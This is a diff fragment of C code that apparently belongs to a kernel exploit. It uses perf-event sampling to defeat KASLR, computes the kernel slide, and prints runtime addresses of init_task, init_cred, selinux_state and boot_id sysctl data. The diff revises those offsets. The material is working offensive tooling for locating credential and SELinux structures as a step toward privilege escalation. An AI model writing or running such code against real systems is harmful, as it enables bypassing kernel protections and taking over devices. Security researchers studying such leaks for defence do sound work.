@@ -51,10 +51,10 @@ static int sample_ips(int *out_nsamp){
   char *data=(char*)base+pg;
   ioctl(fd, PERF_EVENT_IOC_RESET, 0);
   ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
-  char buf[64]; volatile int acc=0;
+  char buf[64];
   for(int i=0;i<400000;i++){
-    int f=open("/dev/null",O_RDONLY); if(f>=0){ acc += read(f,buf,1); close(f); }
-    acc += (int)syscall(SYS_getpid);
+    int f=open("/dev/null",O_RDONLY); if(f>=0){ (void)!read(f,buf,1); close(f); }
+    (void)syscall(SYS_getpid);
   }
   ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
   __sync_synchronize();
@@ -117,10 +117,11 @@ int main(void){
   printf("KASLR slide=0x%llx aligned=%d\n", (unsigned long long)slide, best_n);
   printf("runtime _stext=0x%llx\n", (unsigned long long)(STEXT_LINK+slide));
 
-  /* key runtime addresses */
+  /* key runtime addresses (offsets verified against firmware/symtab.txt) */
   printf("runtime init_task=0x%llx\n", (unsigned long long)(KIMAGE_TEXT_BASE+0x339e100+slide));
   printf("runtime init_cred=0x%llx\n", (unsigned long long)(KIMAGE_TEXT_BASE+0x33ae9c0+slide));
-  printf("runtime selinux_enforcing=0x%llx\n", (unsigned long long)(KIMAGE_TEXT_BASE+0x333000+slide));
-  printf("runtime boot_id_ctl.data=0x%llx\n", (unsigned long long)(KIMAGE_TEXT_BASE+0x3178300+slide));
+  printf("runtime selinux_state=0x%llx\n", (unsigned long long)(KIMAGE_TEXT_BASE+0x4333000+slide));
+  printf("runtime boot_id ctl_table.data=0x%llx\n", (unsigned long long)(KIMAGE_TEXT_BASE+0x344d730+slide));
+  printf("runtime sysctl_bootid=0x%llx\n", (unsigned long long)(KIMAGE_TEXT_BASE+0x3778b64+slide));
   return 0;
 }
